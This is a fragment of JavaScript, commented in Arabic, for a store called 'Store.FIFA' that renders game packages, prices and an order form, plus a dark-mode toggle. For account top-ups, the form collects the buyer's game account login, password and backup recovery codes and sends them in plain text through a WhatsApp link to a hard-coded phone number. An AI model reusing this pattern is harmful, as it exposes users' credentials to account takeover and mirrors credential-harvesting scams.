        const cards = document.querySelectorAll('.card');

        cards.forEach(card => {
            const packageName = card.dataset.packageName;
            const pkg = packages.find(p => p.name === packageName);
            const priceBox = card.querySelector('.price-box');
            
            if (pkg && priceBox) {
                const price = pkg.prices[selectedPlatform];
                priceBox.innerHTML = `
                    <span class="old-price">${price.old} ريال</span>
                    <span class="new-price">${price.new} ريال</span>
                `;
            }
        });
    }

        // إظهار تفاصيل باقة - نقرأ السعر من currentPackage بدل الاعتماد على DOM فقط
        function showDetails(packageName) {
            const pkg = packages.find(p => p.name === packageName);
            if (!pkg) return;

            currentPackage = pkg;
            currentPlatform = mainPlatformSelect.value;
            const priceObj = currentPackage.prices[currentPlatform];

            // إعادة تعيين الفورم
            orderForm.reset();
            shippingMethodSelect.selectedIndex = 0;
            shippingDetailsDiv.innerHTML = '';

            // تحديث نصوص المودال
            packageNameSpan.textContent = currentPackage.name;
            selectedPlatformNameSpan.textContent = mainPlatformSelect.options[mainPlatformSelect.selectedIndex].text;
            selectedPackageOldPriceSpan.textContent = priceObj.old;
            selectedPackageNewPriceSpan.textContent = priceObj.new;

            // عرض النافذة
            orderModal.classList.add('show');

            // التعامل مع إرسال الفورم
            orderForm.onsubmit = function(e) {
                e.preventDefault();
                const name = document.getElementById('name').value;
                const shippingMethod = shippingMethodSelect.value;
                const payment = document.getElementById('payment').value;

                let message = `طلب جديد من Store.FIFA:\n\nالباقة: ${currentPackage.name}\nالمنصة: ${mainPlatformSelect.options[mainPlatformSelect.selectedIndex].text}\nالسعر قبل: ${priceObj.old} ﷼\nالسعر بعد: ${priceObj.new} ﷼\nطريقة الشحن: ${shippingMethod === 'account' ? 'شحن على الحساب' : 'عرض لاعبين'}\nالاسم: ${name}\nطريقة الدفع: ${payment}`;

                if (shippingMethod === 'account') {
                    const account = document.getElementById('account').value;
                    const password = document.getElementById('password').value;
                    const backupCodes = document.getElementById('backupCodes').value;
                    message += `\nالحساب: ${account}\nالباسورد: ${password}\nالأكواد الاحتياطية: ${backupCodes}`;
                }

                const url = `https://wa.me/966532667133?text=${encodeURIComponent(message)}`;
                window.open(url, '_blank');
                closeModal();
            };
        }

        function closeModal() {
            orderModal.classList.remove('show');
            orderForm.reset();
            shippingDetailsDiv.innerHTML = '';
            currentPackage = null;
            currentPlatform = null;
        }

        // إغلاق عند الضغط على الخلفية
        window.onclick = function(event) {
            if (event.target == orderModal) closeModal();
        };

        // تشغيل أولي
        document.addEventListener('DOMContentLoaded', () => {
            renderCards();
            updateCardPrices();
        });

// تحميل الوضع السابق من localStorage
if (localStorage.getItem('theme') === 'dark') {
    document.body.classList.add('dark-mode');
    darkModeBtn.textContent = '☀️';
} else {
    document.body.classList.add('light-mode');
    darkModeBtn.textContent = '🌙';
}

// التبديل عند الضغط
darkModeBtn.addEventListener('click', () => {
    if (document.body.classList.contains('dark-mode')) {
        document.body.classList.remove('dark-mode');
        document.body.classList.add('light-mode');
        darkModeBtn.textContent = '🌙';
        localStorage.setItem('theme', 'light');
    } else {
        document.body.classList.remove('light-mode');
        document.body.classList.add('dark-mode');
        darkModeBtn.textContent = '☀️';
        localStorage.setItem('theme', 'dark');
    }
});
